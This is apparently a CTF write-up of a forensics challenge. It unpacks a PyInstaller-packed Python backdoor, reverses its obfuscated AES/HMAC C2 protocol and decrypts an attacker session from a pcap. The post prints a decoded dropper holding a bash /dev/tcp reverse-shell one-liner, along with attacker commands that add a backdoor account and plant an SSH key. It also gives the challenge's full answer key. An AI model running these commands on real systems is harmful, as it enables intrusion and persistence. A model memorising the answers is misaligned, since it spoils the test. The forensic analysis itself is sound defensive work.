---
layout: post
title: "Ashbinder Signature"
date: 2026-05-22 00:00:00 -0700
categories: challenges
description: A UAC forensic triage bundle from a breached Debian host hides a PyInstaller-packed Python backdoor behind a "system updater" binary; unpacking it, hand-reversing its XOR/base64-obfuscated AES-256-CBC+HMAC protocol, and replaying that protocol against the provided pcap recovers the full attacker session straight out of the capture.
parent: HackTheBox - Apocalypse '26
grand_parent: CTF Events
event: "hackthebox-apocalypse-26"
tags:
  - "HackTheBox"
  - "Linux"
  - "forensics"
  - "PyInstaller"
  - "reverse-engineering"
  - "AES"
  - "HMAC"
  - "pcap-analysis"
  - "C2"
  - "sudo-abuse"
  - "T1027.002"
  - "T1001.003"
  - "T1573.001"
  - "T1082"
  - "T1059.004"
  - "T1005"
  - "T1041"
  - "T1548.003"
  - "T1136.001"
  - "T1036.005"
---
# Ashbinder Signature

## Engagement Notes

Ashbinder Signature is an answer-format forensics challenge — no single
`HTB{...}` flag, but a UAC (Unix-like Artifacts Collector) triage bundle for a
breached host, `ash-wbsrv03`, plus a packet capture, and eleven specific
questions to answer against that evidence. The chain has two very different
halves: static reverse engineering of a PyInstaller-packed Python binary to
recover a hand-obfuscated C2 protocol, then a mechanical replay of that
protocol against the pcap to read out an entire attacker session in the clear.
Getting from the first half to the second required decoding a home-grown
XOR/base64 obfuscation scheme keyword by keyword, by hand — there was no
shortcut around it.

The chain doesn't establish how the attacker first got onto the box; an early
theory pointed at Apache breaching SSH, but the referenced webroot isn't in
the collection and the investigation never returns to it. The challenge's
own questions never ask for an initial-access vector either, so that thread
stays open. The lesson that mattered most in hindsight was structural, not
technical: broad exploration of the dump before reading what the eleven
questions actually asked cost more time than it needed to — several answers
were gated behind specifics (a particular variable name, the *second*
downloaded file) that reading the question list up front would have flagged
as targets to look for directly.

## Attack path

1. **Triage the drop** → a UAC bundle for `ash-wbsrv03` (`10.10.0.10`), plus a
   `capture.pcap`, is opened; `netstat` from the live-response collection shows
   an outbound connection from the victim to `10.10.0.56:443` alongside an
   inbound SSH session.
2. **Apache/SSH theory checked and dropped** → the vhost's `DocumentRoot` isn't
   present anywhere in the triage collection; the angle is abandoned and never
   revisited.
3. **Group-writable pivot** → `system/group_writable_files.txt` singles out
   `/srv/AshShare/linux_sys_updater`, a share-style path.
4. **PyInstaller tell** → `file`/`strings` show a stripped ELF ending in a
   `pydata` section — the PyInstaller packing signature — confirmed and
   unpacked with `pyinstxtractor-ng`, which surfaces `client.pyc` as the entry
   point.
5. **Local decompiler crashes; online decompiler recovers the source** →
   `client.pyc` is copy-pasted directly into `pychaos.io`, which returns a
   fully obfuscated but syntactically valid Python reconstruction.
6. **Hand-reverse the obfuscated protocol** → the recovered source is cleaned
   up function-by-function: AES-256-CBC + HMAC-SHA256 framing, keys derived
   from a hardcoded master secret, and a `xor_obfuscation()` helper
   (base64 → XOR 0x55 → XOR 0xAA) that yields the protocol's keywords
   (`BEACON`, `CMD`, `UPLD_FILE`, `SHUTDOWN`, ...) one call at a time.
7. **Replay against the pcap** → `capture.pcap` is filtered to the port-443
   conversation (56 packets) and every payload is fed through the recovered
   `decrypt_message()`, recovering the full attacker session in the clear.
8. **Read out the session** → sshd_config and `/etc/hosts` downloaded, an SSH
   key uploaded to `kingmaelor`'s `authorized_keys`, a recon/persistence
   command sequence culminating in a new `backup_usr` account and a
   reverse-shell dropper written to disk.
9. **Answer the question set** → the eleven questions in the challenge's
   answer key are matched against the reconstruction above.

## Recon — what's in the drop

`netstat` from the live-response collection shows the victim mid-conversation
on two fronts at once:

```console
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      23/apache2
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      8/sshd: /usr/sbin/s
tcp        0      0 10.10.0.10:49892        10.10.0.56:443          ESTABLISHED -
tcp        0      0 10.10.0.10:22           10.10.0.56:53470        ESTABLISHED -
```

`10.10.0.10` is the victim (`ash-wbsrv03` per `/etc/hosts`); `10.10.0.56` holds
both an active SSH session *and* an outbound connection on port 443. The
working theory recorded at this point in the notebook was that Apache had been
the entry point that led to the SSH session, so the vhost is checked:

```console
!cat 'artifacts/[root]/etc/apache2/sites-enabled/internalop.ash.htb.conf'
<VirtualHost *:80>
    ServerName internalop.ash.htb
    DocumentRoot "/var/www/internalop.ash.htb"
    ...
</VirtualHost>

!ls -alhn 'artifacts/[root]/var/www/internalop.ash.htb'
ls: cannot access 'artifacts/[root]/var/www/internalop.ash.htb': No such file or directory
```

The webroot the vhost points at isn't in the triage collection at all. This
angle was never investigated further — it wasn't needed to answer any of the
eleven questions, so it stays an open thread rather than a resolved dead end.

The pivot instead follows the group-writable file list:

```console
!cat 'artifacts/system/group_writable_files.txt'
/var/log/wtmp
/var/log/lastlog
/var/log/btmp
/etc/supervisor/conf.d/supervisord.conf
/srv/AshShare/linux_sys_updater
```

`/srv/AshShare/linux_sys_updater` is both group-writable and sitting in a
share-style path, which singles it out as the next stop.

## The implant — unpacking `linux_sys_updater`

```console
!file 'artifacts/[root]/srv/AshShare/linux_sys_updater'
artifacts/[root]/srv/AshShare/linux_sys_updater: ELF 64-bit LSB executable, x86-64, ... dynamically linked ... stripped

!strings 'artifacts/[root]/srv/AshShare/linux_sys_updater' | tail -n 5
.got.plt
.data
.bss
.comment
pydata
```

The trailing `pydata` section name is the identifying artifact of a
[PyInstaller](https://github.com/pyinstxtractor/pyinstxtractor-ng)-frozen ELF
binary — on Linux, PyInstaller embeds the packaged Python payload in a custom
ELF section by that name, which is exactly [what
`pyinstxtractor`'s own documentation uses to recognize a packed Linux
binary](https://github.com/extremecoders-re/pyinstxtractor/wiki/Extracting-Linux-ELF-binaries).
[`pyinstxtractor-ng`](https://github.com/pyinstxtractor/pyinstxtractor-ng)
confirms it:

```console
!cd artifacts; ./pyinstxtractor-ng linux_sys_updater
[+] Processing linux_sys_updater
[+] Pyinstaller version: 2.1+
[+] Python version: 3.12
[+] Length of package: 9194029 bytes
[+] Found 96 files in CArchive
[+] Beginning extraction...please standby
[+] Possible entry point: pyiboot01_bootstrap.pyc
[+] Possible entry point: pyi_rth_inspect.pyc
[+] Possible entry point: client.pyc
[+] Found 152 files in PYZ archive
[+] Successfully extracted pyinstaller archive: linux_sys_updater
```

`client.pyc` as an entry point is the tell that this is a C2 client, not a
system tool. A local Python-3.12 decompiler run against the extracted `.pyc`
files crashes outright:

```console
py312-decompiler   main  python decompile.py ../linux_sys_updater_extracted -o decompiled/
Found 159 .pyc files
realloc(): invalid next size
[1]    1943068 abort (core dumped)  python decompile.py ../linux_sys_updater_extracted -o decompiled/
```

> 🧠 No fix or retry was attempted against the crashed local tool — `client.pyc`
> was copy-pasted directly into [pychaos.io](https://pychaos.io/), an online
> Python-bytecode decompiler, bypassing it entirely.

pychaos.io returns a full, syntactically valid reconstruction with every
identifier renamed to noise (`X7wR9t`, `Fg3hY6`, `Jn2bM4`, ...):

```python
X7wR9t = 'ZQLJlA8BYg0iy1qFH0PwpB8tn8Y2DX0j'
def Fg3hY6(Ab4cD2):
  Mn7kL1 = hashlib.sha256(Ab4cD2.encode()).digest()
  Rt9wZ3 = hashlib.sha256(Mn7kL1+'encryption').digest()[:32]
  Yt5xP8 = hashlib.sha256(Mn7kL1+'hmac').digest()[:32]
  return (Rt9wZ3,Yt5xP8)
...
def Jn2bM4(Lp6qR7):
  # base64-decode, then XOR every byte with 0x55, then XOR with 0xAA
  ...
```

## Reversing the obfuscated client

Renaming every function by hand recovers a client that:

1. Derives an AES key and an HMAC key from a hardcoded master secret via
   SHA-256:

   ```python
   MASTER_SECRET = 'ZQLJlA8BYg0iy1qFH0PwpB8tn8Y2DX0j'
   secret_hash = hashlib.sha256(secret.encode()).digest()
   encryption_key = hashlib.sha256(secret_hash + b'encryption').digest()[:32]
   hmac_key = hashlib.sha256(secret_hash + b'hmac').digest()[:32]
   ```

2. Obfuscates every protocol keyword with base64 → XOR 0x55 → XOR 0xAA,
   recovered function-by-function as `xor_obfuscation()` — for example
   `xor_obfuscation('rLeqq7uwqLE=')` decodes to `SHUTDOWN`.
3. Wraps every message as `IV(16) || AES-256-CBC ciphertext ||
   HMAC-SHA256(HMAC_KEY || IV || ciphertext)`, length-prefixed on the wire
   with a 4-byte big-endian length.
4. Connects out to `10.10.0.56:443` and runs a beacon/challenge handshake,
   followed by a small command set: `DWNL_FILE`/`DWNL_DATA` (read a file back
   to the operator), `UPLD_FILE`/`UPLD_DATA` (write a file to disk), `CMD` (run
   a shell command via `subprocess.check_output(..., shell=True)`), and
   `SHUTDOWN`.

The cleaned-up client is rebuilt directly as working Python
(`decrypt_message()` / `encrypt_message()` / `xor_obfuscation()`), keeping the
same crypto constants pulled from the binary:

```python
MASTER_SECRET = 'ZQLJlA8BYg0iy1qFH0PwpB8tn8Y2DX0j'

def derive_keys(secret):
    secret_hash = hashlib.sha256(secret.encode()).digest()
    encryption_key = hashlib.sha256(secret_hash + b'encryption').digest()[:32]
    hmac_key = hashlib.sha256(secret_hash + b'hmac').digest()[:32]
    return encryption_key, hmac_key

def decrypt_message(packet_b64):
    packet = base64.b64decode(packet_b64)
    iv = packet[:16]
    ciphertext = packet[16:-32]
    received_hmac = packet[-32:]
    expected_hmac = hashlib.new('sha256', HMAC_KEY + iv + ciphertext).digest()
    if received_hmac != expected_hmac:
        raise ValueError(xor_obfuscation('t7K+vN+Jmo2WmZacnouWkJHfmZ6Wk5qb'))
    cipher = AES.new(ENCRYPTION_KEY, AES.MODE_CBC, iv)
    return unpad(cipher.decrypt(ciphertext), AES.block_size).decode()
```

The key identity is confirmed by hashing the two derived keys:

```console
6ffc06ff97ec037753feda5354b650b3   <- AES encryption key (MD5)
7b6d734b9c98a261cb71258e28f6a92f   <- HMAC key (MD5)
```

## Replaying the C2 session from the pcap

With the crypto solved, `capture.pcap` is filtered to the port-443
conversation identified in recon:

```python
c2_traffic = [pkt for pkt in pcap if pkt.haslayer(scapy.TCP)
              and (pkt[scapy.TCP].dport == 443 or pkt[scapy.TCP].sport == 443)]
print(len(c2_traffic))   # 56
```

Every Raw payload carries the same 4-byte length prefix as the protocol;
stripping it and feeding the rest to `decrypt_message()` recovers the entire
session in the clear:

```console
Decrypted Payload: BEACON ASH_CLI_nxpgkxxdatxrcbvkeqby 1779476072.6410902
Decrypted Payload: CHALLENGE
Decrypted Payload: CHALLENGE_RESPONSE
Decrypted Payload: DWNL_FILE /etc/ssh/sshd_config
Decrypted Payload: DWNL_DATA [base64 sshd_config elided]
Decrypted Payload: DWNL_ACK
Decrypted Payload: DWNL_FILE /etc/hosts
Decrypted Payload: DWNL_DATA [base64 /etc/hosts elided]
Decrypted Payload: DWNL_ACK
Decrypted Payload: UPLD_FILE /home/kingmaelor/.ssh/authorized_keys
Decrypted Payload: UPLD_DATA [base64: ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINT6AHLFJOhtGkv5YeF2xgp5GCdDBAyWCIBSxpNTKg40 ash@team.htb]
Decrypted Payload: UPLD_ACK
Decrypted Payload: CMD uname -a
Decrypted Payload: OUTPUT ASH_CLI_nxpgkxxdatxrcbvkeqby Linux ash-wbsrv03 6.12.88+deb13-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.12.88-1 (2026-05-15) x86_64 GNU/Linux
Decrypted Payload: CMD ls -la /etc
Failed to decrypt payload.
Failed to decrypt payload.
Decrypted Payload: CMD id
Decrypted Payload: OUTPUT ASH_CLI_nxpgkxxdatxrcbvkeqby uid=1005(kingmaelor) gid=1011(crownspire) groups=1011(crownspire),27(sudo)
Decrypted Payload: CMD sudo -l
Decrypted Payload: OUTPUT ASH_CLI_nxpgkxxdatxrcbvkeqby ... User kingmaelor may run the following commands on ash-wbsrv03:
    (ALL) NOPASSWD: /usr/sbin/useradd, /usr/sbin/usermod, /usr/sbin/chpasswd
Decrypted Payload: CMD sudo useradd -m -s /bin/bash backup_usr && echo 'backup_usr:9cq3jPVN6Me1' | sudo chpasswd
Decrypted Payload: OUTPUT ASH_CLI_nxpgkxxdatxrcbvkeqby
Decrypted Payload: CMD cat /etc/passwd | grep -i backup_usr
Decrypted Payload: OUTPUT ASH_CLI_nxpgkxxdatxrcbvkeqby backup_usr:x:1016:1016::/home/backup_usr:/bin/bash
Decrypted Payload: CMD env
Decrypted Payload: OUTPUT ASH_CLI_nxpgkxxdatxrcbvkeqby [env dump elided]
Decrypted Payload: CMD echo '[base64 gzip elided]' | base64 -d | gunzip | bash
Decrypted Payload: OUTPUT ASH_CLI_nxpgkxxdatxrcbvkeqby
```

> 🧠 The `CMD ls -la /etc` line decrypted fine — it's the *output* packet(s)
> immediately after it that failed twice in a row before the session picked
> back up cleanly on `CMD id`. Getting a clean bidirectional decrypt working
> across the whole capture took a couple of iterations on `decrypt_message()`
> before every packet resolved consistently.

The uploaded key note recorded separately in the notebook — "uploaded a
keyfile (that's not in the forensics dump)" — refers to this exact
`UPLD_FILE`/`UPLD_DATA` exchange: the key was only ever recovered by decrypting
this traffic, and it exists nowhere in the triage collection as a standalone
dropped file — the pcap is its only evidence.

The final `CMD` is a gzip+base64 dropper, decoded directly:

```console
!echo '[base64 gzip elided]' | base64 -d | gunzip

mkdir -p /home/kingmaelor/.local/share && echo 'bash -i >& /dev/tcp/141.101.64.3/53 0>&1' > /home/kingmaelor/.local/share/.systemd-helper && chmod +x /home/kingmaelor/.local/share/.systemd-helper
```

This writes a reverse-shell one-liner to
`/home/kingmaelor/.local/share/.systemd-helper`, named to look like a
legitimate systemd component, pointed at `141.101.64.3:53`. Nothing in the
captured session shows the file being registered as a service, cron entry, or
otherwise made to auto-run — the pcap only shows it written and marked
executable.

## What didn't work

- **The Apache→SSH initial-access theory.** Recorded as the working theory
  before any Apache artifacts were checked, it was actively investigated —
  the vhost config was pulled and its `DocumentRoot` looked up — and dropped
  once that path turned out to be absent from the triage collection entirely.
  It was never revisited: the eleven-question answer key never asks how the
  attacker got in, only what they did with the C2 session, so the initial
  foothold stays an open question rather than a resolved one.
- **The local Python-3.12 decompiler.** Crashed with `realloc(): invalid next
  size` against the extracted `.pyc` files. No retry or fix was attempted —
  the same bytecode was pasted directly into an online decompiler instead.

## Findings — the answer key

This is an answer-format forensics challenge: eleven questions, each matched
against the evidence reconstructed above.

| Question | Answer | Source |
|---|---|---|
| Compromised user (user:group) | `kingmaelor:crownspire` | `id` output in decrypted C2 traffic |
| Implanted binary path | `/srv/AshShare/linux_sys_updater` | `group_writable_files.txt` + `file`/`strings` recon |
| AES key (MD5 of raw key bytes) | `6ffc06ff97ec037753feda5354b650b3` | `derive_keys(MASTER_SECRET)` against the recovered protocol |
| Client-ID prefix | `ASH_CLI_` | `xor_obfuscation()` applied to the recovered protocol constant |
| Command that initiates file upload | `UPLD_FILE` | recovered protocol constants |
| Variable holding shell-command output | `Kd3uD9` | the pychaos.io-decompiled source, the variable next to the `subprocess.check_output` call |
| 2nd command executed in the session | `ls -la /etc` | pcap decrypt sequence — 2nd `CMD` line |
| 2nd file downloaded in the session | `/etc/hosts` | pcap decrypt sequence — 2nd `DWNL_FILE` |
| Persistence user:password created | `backup_usr:9cq3jPVN6Me1` | `sudo useradd ... \| sudo chpasswd` in decrypted traffic |
| Persistence file path | `/home/kingmaelor/.local/share/.systemd-helper` | final gzip+base64 `CMD` in decrypted traffic |
| Reverse shell target (IP:port) | `141.101.64.3:53` | decoded contents of the persistence file |

## Tools used

| Tool | Role on this box | Reference |
|---|---|---|
| pyinstxtractor-ng | Extracted the PyInstaller-packed `client.pyc` from the ELF binary | [github.com/pyinstxtractor/pyinstxtractor-ng](https://github.com/pyinstxtractor/pyinstxtractor-ng) |
| pychaos.io | Online Python-bytecode decompiler; recovered a readable (variable-obfuscated) source for `client.pyc` after the local decompiler crashed | [pychaos.io](https://pychaos.io/) |
| scapy | Loaded and filtered `capture.pcap` to the port-443 C2 conversation | [scapy.net](https://scapy.net/) |
| PyCryptodome (`Crypto.Cipher.AES`) | Reimplemented the recovered AES-256-CBC decryption to replay the C2 session | [pycryptodome.readthedocs.io](https://pycryptodome.readthedocs.io/) |

## Tactics (MITRE ATT&CK)

Only techniques whose definition matches what happened, each verified against
its ATT&CK page:

| Technique | ID | Where |
|---|---|---|
| Obfuscated Files or Information: Software Packing | [T1027.002](https://attack.mitre.org/techniques/T1027/002/) | `linux_sys_updater` is a PyInstaller-packed ELF (the `pydata` section) concealing `client.pyc` |
| Protocol or Service Impersonation | [T1001.003](https://attack.mitre.org/techniques/T1001/003/) | The C2 client connects out on port 443 — the conventional HTTPS port — but speaks a custom AES/HMAC-framed protocol, never TLS |
| Encrypted Channel: Symmetric Cryptography | [T1573.001](https://attack.mitre.org/techniques/T1573/001/) | Every C2 message is AES-256-CBC encrypted with an HMAC-SHA256 integrity check, keyed from a hardcoded master secret |
| System Information Discovery | [T1082](https://attack.mitre.org/techniques/T1082/) | `CMD uname -a` as the first command run over the established C2 session |
| Command and Scripting Interpreter: Unix Shell | [T1059.004](https://attack.mitre.org/techniques/T1059/004/) | The `CMD` protocol keyword runs arbitrary shell commands via `subprocess.check_output(..., shell=True)` |
| Data from Local System | [T1005](https://attack.mitre.org/techniques/T1005/) | `DWNL_FILE` reads of `/etc/ssh/sshd_config` and `/etc/hosts` off the compromised host |
| Exfiltration Over C2 Channel | [T1041](https://attack.mitre.org/techniques/T1041/) | Those same files are read back to the operator over the same AES-encrypted C2 socket, not a separate channel |
| Abuse Elevation Control Mechanism: Sudo and Sudo Caching | [T1548.003](https://attack.mitre.org/techniques/T1548/003/) | `kingmaelor`'s pre-existing `NOPASSWD: /usr/sbin/useradd, /usr/sbin/usermod, /usr/sbin/chpasswd` sudoers entry is used directly to create an account without a password prompt |
| Create Account: Local Account | [T1136.001](https://attack.mitre.org/techniques/T1136/001/) | `sudo useradd -m -s /bin/bash backup_usr && echo 'backup_usr:9cq3jPVN6Me1' \| sudo chpasswd` |
| Masquerading: Match Legitimate Resource Name or Location | [T1036.005](https://attack.mitre.org/techniques/T1036/005/) | The dropped reverse-shell script is named `.systemd-helper`, mimicking a legitimate systemd component |

> **Not tagged, and why:** the dropped `.systemd-helper` file is not tagged
> under a Persistence technique (e.g. T1543.002 Systemd Service) — the
> captured session only shows it written to disk and `chmod +x`'d, never
> registered as a unit, cron entry, or shell-profile hook, so there's no
> evidence in this pcap that it actually survives a reboot or new session.
> Non-Standard Port (T1571) was considered for the port-443 C2 channel and
> rejected — that technique is about pairing a *standard* protocol with an
> *unusual* port (e.g. HTTPS on 8443), which is the opposite of what's here: a
> custom, non-HTTP protocol running on the conventional HTTPS port. T1001.003
> (Protocol Impersonation) is the better fit and is tagged above instead.

## Lessons

- **Read the question set before diving into the dump.** Several of the
  eleven answers were gated behind specifics — a particular renamed variable,
  the *second* file downloaded rather than the first — that broad exploration
  eventually found anyway, but reading the questions up front would have
  turned that exploration into a targeted search from the start.
- **A crashed tool isn't a wall.** The local decompiler's `realloc()` abort
  didn't need debugging; the same bytecode dropped straight into an online
  decompiler and kept the chain moving.
- **Obfuscated protocol constants are just a lookup table once decoded.**
  Every `xor_obfuscation('...')` call in the recovered source resolves to a
  fixed keyword (`BEACON`, `CMD`, `UPLD_FILE`, ...); decoding them once by hand
  turns the rest of the reversed client into ordinary control flow.

## Further reading

**Used during the engagement:**
- [pyinstxtractor-ng](https://github.com/pyinstxtractor/pyinstxtractor-ng)
- [pychaos.io](https://pychaos.io/) — the specific decompile result page
  referenced in the notebook
  (`https://pychaos.io/decompiled?uuid=0e056725-67ed-45cd-b1bc-d0fbb0a017d7`)
  has since expired and redirects to the site root
- [scapy](https://scapy.net/)
- [pyinstxtractor wiki — identifying the `pydata` ELF section](https://github.com/extremecoders-re/pyinstxtractor/wiki/Extracting-Linux-ELF-binaries)

**Standard toolkit bookmarks (shipped with the engagement room template — not
used on this box; the chain here needed none of them):**
- [pspy](https://github.com/DominicBreuker/pspy)
- [linpeas](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS)
- [precompiled binaries](https://github.com/jakobfriedl/precompiled-binaries/tree/main)
- [msfvenom cheatsheet](https://github.com/frizb/MSF-Venom-Cheatsheet)

---

*Provenance: commands, outputs, credentials, and flags are transcribed from
the engagement notebook (shown verbatim — these values are also the literal
answer key for this answer-format challenge). External facts (the PyInstaller
`pydata` packing tell and the MITRE ATT&CK technique definitions) are linked
to their source and were fetched, not recalled.*
